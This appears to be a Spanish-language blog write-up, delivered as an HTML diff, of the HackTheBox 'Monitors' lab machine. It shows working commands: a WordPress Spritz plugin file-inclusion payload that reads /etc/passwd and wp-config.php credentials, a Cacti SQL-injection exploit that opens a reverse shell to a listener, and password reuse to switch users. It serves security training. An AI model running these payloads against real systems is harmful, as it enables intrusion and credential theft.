@@ -1,0 +1,1063 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Monitors - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Monitors - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="El dia de hoy vamos a estar resolviendo la maquina Monitors de hackthebox que es una maquina Linux de dificultad Dificil. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin spritz de Wordpress que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de cacti con una version vulnerable, seguidamente abusaremos de un ataque de deserealizacion con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability sysmodule para escapar del contenedor y ganar acceso a la maquina real como el usuario root." />
+<meta property="og:description" content="El dia de hoy vamos a estar resolviendo la maquina Monitors de hackthebox que es una maquina Linux de dificultad Dificil. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin spritz de Wordpress que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de cacti con una version vulnerable, seguidamente abusaremos de un ataque de deserealizacion con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability sysmodule para escapar del contenedor y ganar acceso a la maquina real como el usuario root." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Monitors" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Monitors" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Monitors/monitors.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-05-14T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Monitors/monitors.jpeg" />
+<meta property="twitter:title" content="Maquina Monitors - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-05-14T00:00:00+00:00","datePublished":"2023-05-14T00:00:00+00:00","description":"El dia de hoy vamos a estar resolviendo la maquina Monitors de hackthebox que es una maquina Linux de dificultad Dificil. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin spritz de Wordpress que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de cacti con una version vulnerable, seguidamente abusaremos de un ataque de deserealizacion con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability sysmodule para escapar del contenedor y ganar acceso a la maquina real como el usuario root.","headline":"Maquina Monitors - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Monitors/monitors.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Monitors"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Monitors"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Monitors - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-05-14">14 May 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Monitors/monitors.jpeg" alt="Maquina Monitors - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>El dia de hoy vamos a estar resolviendo la maquina <code>Monitors</code> de <code>hackthebox</code> que es una maquina <code>Linux</code> de dificultad <code>Dificil</code>. Para explotar esta maquina abusaremos una vulnerabilidad que reside en el plugin <code>spritz</code> de <code>Wordpress</code> que nos permitira realizar leer archivos de la maquina victima, despues explotaremos un servicio de <code>cacti</code> con una version vulnerable, seguidamente abusaremos de un ataque de <code>deserealizacion</code> con el cual ganaremos acceso a un contenedor y finalmente nos aprovecharemos de la capability <code>sysmodule</code> para escapar del contenedor y ganar acceso a la maquina real como el usuario <code>root</code>.</p>
+
+<p>Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Monitors
+❯ ls
+ Monitors
+</code></pre>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap
+</code></pre>
+
+<h2 id="enumeración">Enumeración <a href="#enumeración">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.238
+PING 10.10.10.238 (10.10.10.238) 56(84) bytes of data.
+64 bytes from 10.10.10.238: icmp_seq=1 ttl=63 time=108 ms
+
+--- 10.10.10.238 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 108.365/108.365/108.365/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde con un <code>ttl</code> de <code>63</code> correspondiente a una maquina <code>linux</code>, ahora procederemos a el scaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>allPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.238 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:04 GMT
+Initiating SYN Stealth Scan at 21:04
+Scanning 10.10.10.238 [65535 ports]
+Discovered open port 22/tcp on 10.10.10.238
+Discovered open port 80/tcp on 10.10.10.238
+Completed SYN Stealth Scan at 21:04, 28.62s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.238
+Host is up, received user-set (2.6s latency).
+Scanned at 2023-05-14 21:04:30 GMT for 29s
+Not shown: 60433 closed tcp ports (reset), 5100 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 28.72 seconds
+           Raw packets sent: 110162 (4.847MB) | Rcvd: 86054 (3.442MB)
+</code></pre>
+<p>Podemos ver puertos interesantes que se encuentran abiertos como <code>22 ssh</code> y <code>80 http</code>.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p22,80 10.10.10.238 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-14 21:05 GMT
+Nmap scan report for monitors.htb (10.10.10.238)
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
+|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
+|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Welcome to Monitor &amp;#8211; Taking hardware monitoring seriously
+|_http-generator: WordPress 5.5.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 20.43 seconds
+</code></pre>
+<p>Visulizamos la versión de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>22</td>
+      <td>SSH</td>
+      <td>OpenSSH 7.6p1</td>
+    </tr>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.29</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Primero ya que <code>nmap</code> no detecto el servicio del puerto <code>80</code> se encuentra abierto, trataremos de identificar las tecnologias que usa con la ayuda de <code>whatweb</code>.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.238
+http://10.10.10.238 [403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@monitors.htb], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238]
+</code></pre>
+
+<p>Podemos ver que se esta aplicando virtual hosting, asi que procederemos a agregar el dominio a nuestro <code>/etc/hosts</code>.</p>
+
+<p>Volvemos a usar <code>whatweb</code>, pero esta vez aputando al dominio y esta vez la herramienta nos reporta el gestor de contenido que corresponde a un <code>wordpress</code>.</p>
+
+<pre><code class="language-bash">❯ whatweb http://monitors.htb
+http://monitors.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.238], JQuery, MetaGenerator[WordPress 5.5.1], Script[text/javascript], Title[Welcome to Monitor &amp;#8211; Taking hardware monitoring seriously], UncommonHeaders[link], WordPress[5.5.1]
+</code></pre>
+
+<p>Procedemos a abrir la pagina en nuestro navegador.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Monitors/moni1.PNG" alt="" /></p>
+
+<p>Vemos un articulo publicado por el usuario <code>admin</code>, y para validar que este es un usuario valido podemos intentar logearnos como este en la ruta <code>wp-login.php</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Monitors/moni2.PNG" alt="" /></p>
+
+<p>Ahora al tratarse de un <code>wordpress</code> trataremos de buscar plugins vulnerables asociados, para ello usaremos el diccionario <code>wp-plugins.fuzz.txt</code> del repositorio de <code>seclists</code>, enconjunto con nuestra herramienta de confianza <code>wfuzz</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 100 -w /opt/SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt http://monitors.htb/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://monitors.htb/FUZZ
+Total requests: 13368
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+
+Total time: 36.76465
+Processed Requests: 13368
+Filtered Requests: 13368
+Requests/sec.: 363.6101
+</code></pre>
+
+<p><code>wfuzz</code> no logro descubrir un plugin valido, pero podemos tratar de acceder a la ruta de los <code>plugins</code> y ver si tenemos permiso para lista el directorio.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Monitors/moni3.PNG" alt="" /></p>
+
+<p>Como podemos lista el contenido vemos el servicio usa <code>spritz</code> como plugin, asi que trataremos de buscar si existe una vulnerabilidad asociada a ello con <code>searchsploit</code>.</p>
+
+<pre><code class="language-bash">❯ searchsploit spritz
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin WP with Spritz 1.0 - Remote File Inclusion                                                                                          | php/webapps/44544.php
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Efectivamente tal y como nos reporta existe una vulnerabilidad asociada <code>Remote File Inclusion</code>.</p>
+
+<p>Analizando el codigo del <code>exploit</code> vemos que aprovecha una ruta para poder lista archivos de la maquina.</p>
+
+<pre><code class="language-bash">❯ cat 44544.php
+
+1. Version Disclosure
+
+/wp-content/plugins/wp-with-spritz/readme.txt
+
+2. Source Code
+
+if(isset($_GET['url'])){
+$content=file_get_contents($_GET['url']);
+
+3. Proof of Concept
+
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec
+</code></pre>
+
+<p>Probamos a listar el <code>/etc/hosts</code> de la maquina victima y nos lo muestra con exito.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd"
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
+Debian-snmp:x:112:115::/var/lib/snmp:/bin/false
+mysql:x:109:114:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+
+<p>Como sabemos que el servicio usa <code>apache</code>, podemos trata de listar el <code>000-default.conf</code> y tratar de filtrar información.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-enabled/000-default.conf"
+# Default virtual host settings
+# Add monitors.htb.conf
+# Add cacti-admin.monitors.htb.conf
+</code></pre>
+
+<p>Vemos que existe otro <code>subdominio</code>, asi que procederemos a agregarlo tambien a nuestro <code>/etc/hosts</code>.</p>
+
+<pre><code class="language-bash">❯ echo "10.10.10.238 cacti-admin.monitors.htb" &gt;&gt; /etc/hosts
+</code></pre>
+
+<p>Ahora visiualizamos el servicio en el navegador.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Monitors/moni4.PNG" alt="" /></p>
+
+<p>Vemos que usa <code>cacti</code> y con una version concreta correspondiente a la <code>1.2.12</code> y que tiene una vulnerabilidad asociada.</p>
+
+<blockquote>
+  <p>Cacti es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas que poseen las aplicaciones RRDtool.</p>
+</blockquote>
+
+<pre><code class="language-bash">❯ searchsploit cacti 1.2.12
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Cacti 1.2.12 - 'filter' SQL Injection                                                                                                                | php/webapps/49810.py
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Examinando el <code>exploit</code> vemos que deriva en una ejecución de comandos, y al ejecutarlo nos pide un <code>usuario y contraseña'</code>.</p>
+
+<pre><code class="language-bash">❯ python3 cacti.py
+usage: cacti.py [-h] -t &lt;target/host URL&gt; -u &lt;user&gt; -p &lt;password&gt; --lhost &lt;lhost&gt; --lport &lt;lport&gt;
+cacti.py: error: the following arguments are required: -t, -u, -p, --lhost, --lport
+</code></pre>
+
+<p>Debemos recordar que al enfrentarnos a un <code>wordpress</code>, podemos listar el <code>wp-config.php</code> y obtener unas credenciales validas, para ello podemos usar el <code>exploit spritz</code> y un wraper encoding de <code>base64</code>.</p>
+
+<pre><code class="language-bash">❯ curl -s -X GET "http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=php://filter/convert.base64-encode/resource=../../../wp-config.php" | base64 -d
+&lt;?php
+*
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to "wp-config.php" and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** MySQL database username */
+define( 'DB_USER', 'wpadmin' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'BestAdministrator@2020!' );
+</code></pre>
+
+<p>Obtemos unas credenciales que justamente son validas para el servicio <code>cacti</code>, asi que usaremos el <code>exploit</code> con los parametros necesarios y nos pondremos en escucha con <code>ncat</code> en el puerto <code>443</code>.</p>
+
+<pre><code class="language-bash">❯ python3 cacti.py -t http://cacti-admin.monitors.htb -u 'admin' -p 'BestAdministrator@2020!' --lhost 10.10.16.3 --lport 443
+[+] Connecting to the server...
+[+] Retrieving CSRF token...
+[+] Got CSRF token: sid:127e441cbfce235feca8a95a0ffa545f8f9f4f02,1684101076
+[+] Trying to log in...
+[+] Successfully logged in!
+
+[+] SQL Injection:
+"name","hex"
+"admin","$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK"
+"guest","43e9a4ab75570f5b"
+
+[+] Check your nc listener!
+</code></pre>
+
+<p>Recibimos la conexion como <code>www-data</code> y estamos en la maquina victima.</p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.238.
+Ncat: Connection from 10.10.10.238:38574.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ hostname -I
+10.10.10.238 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:29a3
+</code></pre>
+
+<p>Como es de costumbre vamos a conseguir una <code>tty</code> full interactiva.</p>
+
+<pre><code class="language-bash">$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@monitors:/usr/share/cacti/cacti$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@monitors:/usr/share/cacti/cacti$ export TERM=xterm
+www-data@monitors:/usr/share/cacti/cacti$ export SHELL=bash
+www-data@monitors:/usr/share/cacti/cacti$ stty rows 45 columns 184
+</code></pre>
+
+<p>Nos dirigimos al directorio personal del usuario <code>marcus</code> y vemos que aun no podemos visualizar la <code>flag</code> como <code>www-data</code>.</p>
+
+<pre><code class="language-bash">www-data@monitors:/home$ cd marcus/
+www-data@monitors:/home/marcus$ ls
+note.txt  user.txt
+www-data@monitors:/home/marcus$ cat user.txt 
+cat: user.txt: Permission denied
+</code></pre>
+
+<p>Como tenemos un servicio <code>cacti</code> vamos a tratar de filtrar desde la raiz archivos que contengan la palabra <code>cacti</code> y encontramos una ruta con un archivo <code>cacti-backup-service</code>.</p>
+
+<pre><code class="language-bash">www-data@monitors:/home/marcus$ find / -name \*cacti\* 2&gt;/dev/null
+/etc/apache2/sites-available/cacti-admin.monitors.htb.conf
+/etc/apache2/sites-enabled/cacti-admin.monitors.htb.conf
+/etc/systemd/system/cacti-backup.service
+/lib/systemd/system/cacti-backup.service
+/var/log/cacti-access.log
+/var/log/cacti-error.log
+/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitor.htb
+/var/lib/apache2/site/enabled_by_admin/cacti-admin.monitors.htb
+/usr/share/cacti
+/usr/share/cacti/cacti
+/usr/share/cacti/cacti/log/cacti.log
+/usr/share/cacti/cacti/locales/po/cacti.pot
+/usr/share/cacti/cacti/scripts/cacti_user_stats.php
+/usr/share/cacti/cacti/include/cacti_version
+</code></pre>
+
+<p>Leemos el archivo y dentro nos muestra que dentro del directorio oculto <code>.backup</code> se encuentra un archivo <code>backup.sh</code>.</p>
+
+<pre><code class="language-bash">www-data@monitors:/home/marcus$ cat /etc/systemd/system/cacti-backup.service 
+[Unit]
+Description=Cacti Backup Service
+After=network.target
+
+[Service]
+Type=oneshot
+User=www-data
+ExecStart=/home/marcus/.backup/backup.sh
+
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+
+<p>Leemos el archivo <code>backup.sh</code> y encontramos unas credenciales.</p>
+
+<pre><code class="language-bash">www-data@monitors:/home/marcus$ cat /home/marcus/.backup/backup.sh
+#!/bin/bash
+
+backup_name="cacti_backup"
+config_pass="VerticalEdge2020"
+
+zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
+sshpass -p "${config_pass}" scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
+rm /tmp/${backup_name}.zip
+</code></pre>
+
+<p>Probamos la contraseña y podemos convertirnos en el usuario <code>marcus</code> y ahora si podemos visualizar la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">www-data@monitors:/home/marcus$ su marcus
+Password: 
+marcus@monitors:~$ whoami
+marcus
+marcus@monitors:~$ cat /home/marcus/user.txt 
+055c999cf2967582c6bd59b2cd7fd44f
+</code></pre>
+
+<p>Enumerando el sistema al lista los puertos abiertos en la maquina, vemos un puerto curioso <code>8443</code>.</p>
+
+<pre><code class="language-bash">marcus@monitors:~$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
+tcp        0      1 10.10.10.238:59308      1.1.1.1:53              SYN_SENT   
+tcp        0    138 10.10.10.238:38574      10.10.16.3:443          ESTABLISHED
+tcp6       0      0 :::22                   :::*                    LISTEN     
+tcp6       0      0 :::80                   :::*                    LISTEN     
+tcp6       1      0 10.10.10.238:80         10.10.16.3:38872        CLOSE_WAIT
+</code></pre>
+
+<p>Para poder tener acceso a el desde nuestra maquina, nos conectaremos como el usuario <code>marcus</code> por el servicio <code>ssh</code>, que si recordamos estaba abierto y aplicaremos un <code>local port forwarding</code>.</p>
+
+<pre><code class="language-bash">❯ ssh marcus@10.10.10.238 -L 8443:127.0.0.1:8443
+marcus@10.10.10.238's password: 
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Sun May 14 22:16:22 UTC 2023
+
+  System load:  0.08               Users logged in:                0
+  Usage of /:   34.9% of 17.59GB   IP address for ens160:          10.10.10.238
+  Memory usage: 46%                IP address for docker0:         172.17.0.1
+  Swap usage:   0%                 IP address for br-968a1c1855aa: 172.18.0.1
+  Processes:    189
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+128 packages can be updated.
+97 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Sun May 14 22:13:41 2023 from 10.10.16.3
+marcus@monitors:~$ 
+</code></pre>
+<p>Verificamos que tenemos conexion al puerto.</p>
+
+<pre><code class="language-bash">❯ lsof -i:8443
+COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
+ssh     66347 root    4u  IPv6 258489      0t0  TCP localhost:8443 (LISTEN)
+ssh     66347 root    5u  IPv4 258490      0t0  TCP localhost:8443 (LISTEN)
